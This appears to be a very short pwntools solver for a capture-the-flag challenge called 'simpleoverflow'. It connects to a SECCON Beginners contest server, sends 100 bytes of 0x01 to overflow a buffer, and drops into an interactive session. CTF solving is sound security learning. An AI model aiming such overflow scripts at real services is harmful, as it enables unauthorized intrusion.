from pwn import *


# nc simpleoverflow.beginners.seccon.games 9000
io = remote("simpleoverflow.beginners.seccon.games", 9000)

io.sendline(b"\x01" * 100)
io.interactive()
